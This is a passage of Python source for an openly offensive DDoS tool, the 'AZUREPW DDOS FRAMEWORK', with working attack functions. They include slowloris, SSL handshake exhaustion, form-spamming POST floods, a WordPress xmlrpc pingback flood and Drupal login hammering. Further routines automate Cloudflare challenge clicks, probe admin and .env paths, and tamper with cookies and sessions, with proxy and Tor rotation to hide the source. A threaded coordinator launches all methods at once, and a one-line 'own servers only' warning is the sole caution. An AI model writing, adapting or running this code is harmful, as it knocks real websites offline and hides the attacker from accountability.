            ssl_sock.send(b"GET / HTTP/1.1\r\n")
            ssl_sock.send(f"Host: {TARGET_DOMAIN if TARGET_DOMAIN else TARGET_IP}\r\n".encode())
            ssl_sock.send(b"User-Agent: Mozilla/5.0\r\n")
            ssl_sock.send(b"Accept: */*\r\n")
            ssl_sock.send(b"Connection: keep-alive\r\n")
            
            while time.time() - start_time < DURATION:
                ssl_sock.send(b"X-a: " + os.urandom(1) + b"\r\n")
                time.sleep(15)
                ATTACK_STATS["hits"] += 1
        except:
            ATTACK_STATS["errors"] += 1

def ssl_exhaustion():
    start_time = time.time()
    while time.time() - start_time < DURATION:
        try:
            context = ssl.create_default_context()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            if PROXY_LIST:
                proxy = random.choice(PROXY_LIST)
                proxy_host, proxy_port = proxy.split(':')
                s.connect((proxy_host, int(proxy_port)))
                s.send(f"CONNECT {TARGET_IP}:443 HTTP/1.1\r\nHost: {TARGET_IP}\r\n\r\n".encode())
                response = s.recv(4096)
            elif TOR_PROXY:
                socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
                s = socks.socksocket
                s.connect((TARGET_IP, 443))
            else:
                s.connect((TARGET_IP, 443))
            
            ssl_sock = context.wrap_socket(s, server_hostname=TARGET_DOMAIN if TARGET_DOMAIN else TARGET_IP)
            
            while time.time() - start_time < DURATION:
                ssl_sock.do_handshake()
                time.sleep(1)
                ATTACK_STATS["hits"] += 1
        except:
            ATTACK_STATS["errors"] += 1

def post_flood():
    start_time = time.time()
    while time.time() - start_time < DURATION:
        try:
            headers = generate_headers()
            
            proxies = None
            if PROXY_LIST:
                proxy = random.choice(PROXY_LIST)
                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
            elif TOR_PROXY:
                proxies = {"http": TOR_PROXY, "https": TOR_PROXY}
            
            response = requests.get(TARGET_URL, headers=headers, proxies=proxies, timeout=5, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for form in soup.find_all('form'):
                action = form.get('action', '/')
                method = form.get('method', 'get').lower()
                
                if method == 'post':
                    data = {}
                    for input_tag in form.find_all('input'):
                        name = input_tag.get('name')
                        if name:
                            data[name] = os.urandom(10).hex()
                    
                    url = TARGET_URL + action if action.startswith('/') else action
                    requests.post(
                        url, 
                        data=data, 
                        headers=headers, 
                        proxies=proxies, 
                        timeout=5, 
                        verify=False
                    )
                    ATTACK_STATS["hits"] += 1
        except:
            ATTACK_STATS["errors"] += 1

def xmlrpc_flood():
    start_time = time.time()
    while time.time() - start_time < DURATION:
        try:
            headers = generate_headers()
            headers['Content-Type'] = 'application/xml'
            
            proxies = None
            if PROXY_LIST:
                proxy = random.choice(PROXY_LIST)
                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
            elif TOR_PROXY:
                proxies = {"http": TOR_PROXY, "https": TOR_PROXY}
            
            xml_payload = """<?xml version="1.0" encoding="iso-8859-1"?>
            <methodCall>
            <methodName>pingback.ping</methodName>
            <params>
            <param><value><string>http://{}/</string></value></param>
            <param><value><string>{}</string></value></param>
            </params>
            </methodCall>""".format(
                f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
                TARGET_URL
            )
            
            response = requests.post(
                f"{TARGET_URL}/xmlrpc.php", 
                data=xml_payload, 
                headers=headers, 
                proxies=proxies, 
                timeout=5, 
                verify=False
            )
            ATTACK_STATS["hits"] += 1
        except:
            ATTACK_STATS["errors"] += 1

def drupal_http_flood():
    start_time = time.time()
    while time.time() - start_time < DURATION:
        try:
            headers = generate_headers()
            
            proxies = None
            if PROXY_LIST:
                proxy = random.choice(PROXY_LIST)
                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
            elif TOR_PROXY:
                proxies = {"http": TOR_PROXY, "https": TOR_PROXY}
            
            # Drupal-specific attack
            url = f"{TARGET_URL}/?q=node&destination=node"
            data = {
                'name': 'admin',
                'pass': 'password',
                'form_id': 'user_login',
                'op': 'Log in'
            }
            
            response = requests.post(
                url, 
                data=data, 
                headers=headers, 
                proxies=proxies, 
                timeout=5, 
                verify=False
            )
            ATTACK_STATS["hits"] += 1
        except:
            ATTACK_STATS["errors"] += 1

# ===== BYPASS FUNCTIONS =====
def cloudflare_bypass():
    if not TARGET_DOMAIN:
        return
        
    driver = setup_selenium()
    if not driver:
        return
        
    start_time = time.time()
    
    try:
        while time.time() - start_time < DURATION:
            driver.get(TARGET_URL)
            time.sleep(5)
            
            # Try to solve challenge
            try:
                # Check for Cloudflare challenge
                if "cloudflare" in driver.page_source.lower():
                    # Try different interactions
                    elements = driver.find_elements(By.XPATH, "//input[@type='checkbox']")
                    if elements:
                        elements[0].click()
                        time.sleep(2)
                    
                    # Try to find and click verify button
                    buttons = driver.find_elements(By.XPATH, "//button[contains(text(), 'Verify')]")
                    if buttons:
                        buttons[0].click()
                        time.sleep(5)
                
                # Try to interact with page
                search_inputs = driver.find_elements(By.NAME, "q")
                if search_inputs:
                    search_inputs[0].send_keys("test")
                    search_inputs[0].submit()
                    time.sleep(10)
                    ATTACK_STATS["hits"] += 1
            except:
                pass
            
            time.sleep(10)
    except:
        pass
    finally:
        try:
            driver.quit()
        except:
            pass

def honeypot_bypass():
    start_time = time.time()
    while time.time() - start_time < DURATION:
        try:
            headers = generate_headers()
            
            # Add honeypot-specific headers
            headers['X-Honeypot'] = 'false'
            headers['X-Bot'] = 'false'
            headers['X-Scanner'] = 'false'
            
            proxies = None
            if PROXY_LIST:
                proxy = random.choice(PROXY_LIST)
                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
            elif TOR_PROXY:
                proxies = {"http": TOR_PROXY, "https": TOR_PROXY}
            
            # Try different paths to detect honeypot
            paths = [
                '/admin', '/wp-admin', '/phpmyadmin', '/.env', 
                '/config', '/setup', '/install', '/test'
            ]
            
            for path in paths:
                url = TARGET_URL + path
                response = requests.get(
                    url, 
                    headers=headers, 
                    proxies=proxies, 
                    timeout=3, 
                    verify=False,
                    allow_redirects=False
                )
                
                # Check for honeypot responses
                if response.status_code in [200, 301, 302]:
                    # Not a honeypot, continue attack
                    ATTACK_STATS["hits"] += 1
                else:
                    # Possible honeypot, skip this path
                    ATTACK_STATS["errors"] += 1
        except:
            ATTACK_STATS["errors"] += 1

def cookie_tampering():
    start_time = time.time()
    while time.time() - start_time < DURATION:
        try:
            headers = generate_headers()
            
            proxies = None
            if PROXY_LIST:
                proxy = random.choice(PROXY_LIST)
                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
            elif TOR_PROXY:
                proxies = {"http": TOR_PROXY, "https": TOR_PROXY}
            
            # Get initial response to extract cookies
            response = requests.get(
                TARGET_URL, 
                headers=headers, 
                proxies=proxies, 
                timeout=5, 
                verify=False
            )
            
            # Extract and tamper with cookies
            cookies = response.cookies.get_dict()
            for cookie_name in cookies:
                # Tamper with cookie value
                cookies[cookie_name] = base64.b64encode(os.urandom(16)).decode()
                
                # Send tampered cookie
                headers['Cookie'] = '; '.join([f"{k}={v}" for k, v in cookies.items()])
                
                requests.get(
                    TARGET_URL, 
                    headers=headers, 
                    proxies=proxies, 
                    timeout=5, 
                    verify=False
                )
                ATTACK_STATS["hits"] += 1
        except:
            ATTACK_STATS["errors"] += 1

def session_fixation():
    start_time = time.time()
    while time.time() - start_time < DURATION:
        try:
            headers = generate_headers()
            
            proxies = None
            if PROXY_LIST:
                proxy = random.choice(PROXY_LIST)
                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
            elif TOR_PROXY:
                proxies = {"http": TOR_PROXY, "https": TOR_PROXY}
            
            # Generate session ID
            session_id = base64.b64encode(os.urandom(16)).decode()
            
            # Set session cookie
            headers['Cookie'] = f'session_id={session_id}'
            
            # Send request with session
            response = requests.get(
                TARGET_URL, 
                headers=headers, 
                proxies=proxies, 
                timeout=5, 
                verify=False
            )
            
            # Try to use session in different request
            headers2 = generate_headers()
            headers2['Cookie'] = f'session_id={session_id}'
            
            response2 = requests.post(
                TARGET_URL, 
                data={'test': 'data'}, 
                headers=headers2, 
                proxies=proxies, 
                timeout=5, 
                verify=False
            )
            
            ATTACK_STATS["hits"] += 2
        except:
            ATTACK_STATS["errors"] += 1

# ===== STATISTICS MONITOR =====
def stats_monitor():
    while True:
        if ATTACK_STATS["start_time"]:
            elapsed = time.time() - ATTACK_STATS["start_time"]
            hits_per_sec = ATTACK_STATS["hits"] / elapsed if elapsed > 0 else 0
            
            print(f"\r[STATS] Hits: {ATTACK_STATS['hits']} | Errors: {ATTACK_STATS['errors']} | Hits/sec: {hits_per_sec:.2f}", end="")
        
        time.sleep(1)

# ===== MAIN ATTACK COORDINATOR =====
def start_attack(method_choice):
    global ATTACK_STATS
    
    ATTACK_STATS["start_time"] = time.time()
    
    print("\n" + "="*80)
    print("   ATTACK CONFIGURATION")
    print("="*80)
    print(f"   Target: {TARGET_DOMAIN if TARGET_DOMAIN else TARGET_IP}")
    print(f"   IP: {TARGET_IP}")
    print(f"   URL: {TARGET_URL}")
    print(f"   Duration: {DURATION} seconds")
    print(f"   Threads: {THREADS}")
    print(f"   Method: {method_choice}")
    print(f"   Proxy Rotation: {'ON' if PROXY_LIST else 'OFF'}")
    print(f"   Tor Network: {'ON' if TOR_PROXY else 'OFF'}")
    print(f"   Traffic Encryption: {'ON' if ENCRYPT_TRAFFIC else 'OFF'}")
    print(f"   Header Randomization: {'ON' if RANDOMIZE_HEADERS else 'OFF'}")
    print(f"   Cloudflare Bypass: {'ON' if CLOUDFLARE_BYPASS else 'OFF'}")
    print(f"   Honeypot Bypass: {'ON' if HONEYPOT_BYPASS else 'OFF'}")
    print(f"   Cookie Tampering: {'ON' if COOKIE_TAMPERING else 'OFF'}")
    print(f"   Session Fixation: {'ON' if SESSION_FIXATION else 'OFF'}")
    print("="*80)
    print("[!] WARNING: HANYA UNTUK SERVER SENDIRI!")
    print("[!] STARTING ATTACK...\n")
    
    # Start stats monitor thread
    stats_thread = threading.Thread(target=stats_monitor)
    stats_thread.daemon = True
    stats_thread.start()
    
    # Select techniques based on method choice
    if method_choice == '1':  # All methods
        techniques = [
            # Layer 3
            ip_fragmentation, icmp_flood,
            # Layer 4
            syn_flood, ack_flood, rst_flood, udp_flood,
            # Amplification
            dns_amplification, ntp_amplification, memcached_amplification,
            snmp_amplification, chargen_amplification, ssdp_amplification,
            # Layer 7
            http_flood, connection_hammering, request_hammering,
            slowloris, ssl_exhaustion, post_flood,
            xmlrpc_flood, drupal_http_flood,
            # Bypass
            cloudflare_bypass, honeypot_bypass,
            cookie_tampering, session_fixation
        ]
    
    elif method_choice == '2':  # Layer 3
        techniques = [ip_fragmentation, icmp_flood]
    
    elif method_choice == '3':  # Layer 4
        techniques = [
            syn_flood, ack_flood, rst_flood, udp_flood,
            dns_amplification, ntp_amplification, memcached_amplification,
            snmp_amplification, chargen_amplification, ssdp_amplification
        ]
    
    elif method_choice == '4':  # Layer 7
        techniques = [
            http_flood, connection_hammering, request_hammering,
            slowloris, ssl_exhaustion, post_flood,
            xmlrpc_flood, drupal_http_flood
        ]
    
    elif method_choice == '5':  # Advanced Bypass
        techniques = [
            cloudflare_bypass, honeypot_bypass,
            cookie_tampering, session_fixation
        ]
    
    elif method_choice == '6':  # Specialized Attacks
        techniques = [
            xmlrpc_flood, drupal_http_flood,
            connection_hammering, request_hammering
        ]
    
    elif method_choice == '7':  # Custom Attack
        print("\n[!] Custom Attack Mode - Select techniques:")
        print("    1. Layer 3 (IP Fragmentation, ICMP)")
        print("    2. Layer 4 (SYN/ACK/RST Floods)")
        print("    3. Amplification (DNS/NTP/Memcached)")
        print("    4. Layer 7 (HTTP/Slowloris)")
        print("    5. Bypass (Cloudflare/Honeypot)")
        print("    6. Specialized (WordPress/Drupal)")
        
        custom_choices = input("    Enter numbers separated by comma (e.g., 1,3,5): ").strip()
        selected = [int(x) for x in custom_choices.split(',')]
        
        techniques = []
        if 1 in selected:
            techniques.extend([ip_fragmentation, icmp_flood])
        if 2 in selected:
            techniques.extend([syn_flood, ack_flood, rst_flood])
        if 3 in selected:
            techniques.extend([dns_amplification, ntp_amplification, memcached_amplification])
        if 4 in selected:
            techniques.extend([http_flood, slowloris, ssl_exhaustion])
        if 5 in selected:
            techniques.extend([cloudflare_bypass, honeypot_bypass])
        if 6 in selected:
            techniques.extend([xmlrpc_flood, drupal_http_flood])
    
    elif method_choice == '8':  # VPS Management
        vps_management_menu()
        return
    
    elif method_choice == '9':  # System Status
        show_system_status()
        input(f"\n{Colors.YELLOW}[!] Press Enter to continue...{Colors.ENDC}")
        return
    
    # Run attacks
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for tech in techniques:
            for _ in range(THREADS // len(techniques)):
                executor.submit(tech)

# ===== ORIGINAL MAIN FUNCTION =====
def main():
    global DURATION, THREADS, PROTOCOL, CLOUDFLARE_BYPASS, HONEYPOT_BYPASS, ENCRYPT_TRAFFIC, RANDOMIZE_HEADERS, COOKIE_TAMPERING, SESSION_FIXATION
    
    # Show banner
    print(f"""
{Colors.CYAN}
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║    {Colors.BOLD}AZUREPW DDOS FRAMEWORK v1.0 - FREE EDITION      {Colors.ENDC}{Colors.CYAN}          ║
║    Original: NEG+  CYBER TEAM NEVER BREAKDOWN !!!!!!!        ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
{Colors.ENDC}
""")
    
    # Detect platform
    detect_platform()
    
    # Handle Android
    if PLATFORM == "android":
        show_android_disclaimer()
        return
    
    # Check dependencies
    if not check_dependencies():
        print(f"\n{Colors.YELLOW}[!] Installing missing dependencies...{Colors.ENDC}")
        if not install_dependencies():
            print(f"{Colors.RED}[✗] Failed to install dependencies!{Colors.ENDC}")
            input(f"{Colors.YELLOW}[!] Press Enter to exit...{Colors.ENDC}")
            return
    
    # Setup VPS environment if Docker is available
    if DOCKER_INSTALLED and not VPS_READY:
        print(f"\n{Colors.YELLOW}[!] Setting up VPS environment...{Colors.ENDC}")
        if not setup_vps_environment():
            print(f"{Colors.YELLOW}[!] Continuing without VPS mode...{Colors.ENDC}")
    
    # Get user input from CLI menu
    options = cli_menu()
    
    # Set global variables
    DURATION = options['duration']
    THREADS = options['threads']
    CLOUDFLARE_BYPASS = options['cloudflare']
    HONEYPOT_BYPASS = options['honeypot']
    ENCRYPT_TRAFFIC = options['encrypt']
    RANDOMIZE_HEADERS = options['random_headers']
    COOKIE_TAMPERING = options['cookie']
    SESSION_FIXATION = options['session']
    
    # Load proxies if provided
    if options['proxy_file']:
        load_proxies(options['proxy_file'])
    
    # Setup Tor if enabled
    tor_process = None
    if options['tor']:
        tor_process = setup_tor()
    
    # Resolve target
    resolve_target(options['target'])
    
    # Start attack or management
    if options['method'] in ['8', '9']:
        start_attack(options['method'])
    else:
        start_attack(options['method'])
    
    # Cleanup
    if tor_process:
        tor_process.terminate()

if __name__ == "__main__":
    main()